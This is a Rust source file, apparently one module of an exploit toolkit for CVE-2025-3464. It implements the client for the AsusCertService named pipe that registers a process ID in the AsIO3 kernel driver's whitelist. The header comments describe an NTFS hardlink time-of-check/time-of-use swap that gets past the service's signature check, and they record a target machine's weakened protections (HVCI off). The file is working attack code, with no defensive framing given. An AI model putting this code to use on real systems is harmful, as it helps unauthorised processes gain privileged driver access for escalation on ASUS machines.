//! AsIO3 Pipe Protocol Client
//!
//! Implements the AsusCertService named pipe protocol to register a PID
//! in the AsIO3 driver's whitelist, enabling subsequent device access.
//!
//! Protocol (from pipe_protocol.md):
//!   1. Connect to \\.\pipe\asuscert
//!   2. Write 4-byte PID of the process to whitelist
//!   3. AsusCertService verifies the PID's code signature (WinVerifyTrust)
//!   4. If signed by ASUS, registers PID via IOCTL 0xA040A490 to driver
//!   5. Returns "OK!" regardless of success/failure
//!
//! Exploitation (CVE-2025-3464 hardlink bypass):
//!   The signature check hashes the exe at the ImagePath of the calling PID.
//!   Via NTFS hardlink swap (TOCTOU), we can make the check read
//!   AsusCertService.exe's hash while our code runs.
//!
//! Current system state (2026-07-15):
//!   - AsIO3 v1.03.02 loaded (Boot-start, service "Asusgio3")
//!   - AsusCertService v1.03.02 running
//!   - Pipe: \\.\pipe\asuscert (single instance, message mode)
//!   - Device: \\Device\\Asusgio3 (symlink in \GLOBAL?? exists)
//!   - CreateFile("\\.\Asusgio3") returns FILE_NOT_FOUND without PID registration
//!   - HVCI: OFF, VDB: DISABLED

use std::io;
use std::ptr;

#[cfg(windows)]
mod ffi {
    use std::ffi::c_void;
    pub type HANDLE = *mut c_void;
    pub type DWORD = u32;
    pub type BOOL = i32;
    pub type LPCWSTR = *const u16;

    pub const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;
    pub const GENERIC_READ: DWORD = 0x80000000;
    pub const GENERIC_WRITE: DWORD = 0x40000000;
    pub const OPEN_EXISTING: DWORD = 3;
    pub const FILE_ATTRIBUTE_NORMAL: DWORD = 0x80;

    extern "system" {
        pub fn CreateFileW(
            lpFileName: LPCWSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD,
            lpSecurityAttributes: *mut c_void, dwCreationDisposition: DWORD,
            dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE,
        ) -> HANDLE;
        pub fn WriteFile(
            hFile: HANDLE, lpBuffer: *const c_void, nNumberOfBytesToWrite: DWORD,
            lpNumberOfBytesWritten: *mut DWORD, lpOverlapped: *mut c_void,
        ) -> BOOL;
        pub fn ReadFile(
            hFile: HANDLE, lpBuffer: *mut c_void, nNumberOfBytesToRead: DWORD,
            lpNumberOfBytesRead: *mut DWORD, lpOverlapped: *mut c_void,
        ) -> BOOL;
        pub fn CloseHandle(hObject: HANDLE) -> BOOL;
        pub fn GetCurrentProcessId() -> DWORD;
        pub fn GetLastError() -> DWORD;
    }
}

const PIPE_PATH: &str = r"\\.\pipe\asuscert";

/// Connect to the AsusCertService pipe and attempt PID registration.
///
/// Returns Ok(response_string) on pipe communication success.
/// Note: "OK!" response does NOT mean PID was actually registered —
/// the pipe always returns "OK!" regardless of signature verification result.
#[cfg(windows)]
pub fn register_pid_via_pipe(pid: u32) -> io::Result<String> {
    let path: Vec<u16> = PIPE_PATH.encode_utf16().chain(std::iter::once(0)).collect();

    let handle = unsafe {
        ffi::CreateFileW(
            path.as_ptr(),
            ffi::GENERIC_READ | ffi::GENERIC_WRITE,
            0,
            ptr::null_mut(),
            ffi::OPEN_EXISTING,
            ffi::FILE_ATTRIBUTE_NORMAL,
            ptr::null_mut(),
        )
    };

    if handle == ffi::INVALID_HANDLE_VALUE {
        return Err(io::Error::last_os_error());
    }

    // Write 4-byte PID
    let pid_bytes = pid.to_le_bytes();
    let mut written: u32 = 0;
    let ok = unsafe {
        ffi::WriteFile(
            handle,
            pid_bytes.as_ptr() as *const _,
            4,
            &mut written,
            ptr::null_mut(),
        )
    };
    if ok == 0 {
        unsafe { ffi::CloseHandle(handle); }
        return Err(io::Error::last_os_error());
    }

    // Read response (typically "OK!" = 3 bytes + null)
    let mut buf = [0u8; 64];
    let mut read: u32 = 0;
    let ok = unsafe {
        ffi::ReadFile(
            handle,
            buf.as_mut_ptr() as *mut _,
            64,
            &mut read,
            ptr::null_mut(),
        )
    };
    unsafe { ffi::CloseHandle(handle); }

    if ok == 0 {
        return Err(io::Error::last_os_error());
    }

    let response = String::from_utf8_lossy(&buf[..read as usize]).to_string();
    Ok(response)
}

/// Register the current process's PID via the AsusCertService pipe.
/// This will only succeed if our process passes the WinVerifyTrust check
/// (i.e., we are running as an ASUS-signed binary, or we used the hardlink bypass).
#[cfg(windows)]
pub fn register_self() -> io::Result<String> {
    let pid = unsafe { ffi::GetCurrentProcessId() };
    register_pid_via_pipe(pid)
}

#[cfg(not(windows))]
pub fn register_pid_via_pipe(_pid: u32) -> io::Result<String> {
    Err(io::Error::new(io::ErrorKind::Unsupported, "windows only"))
}

#[cfg(not(windows))]
pub fn register_self() -> io::Result<String> {
    Err(io::Error::new(io::ErrorKind::Unsupported, "windows only"))
}
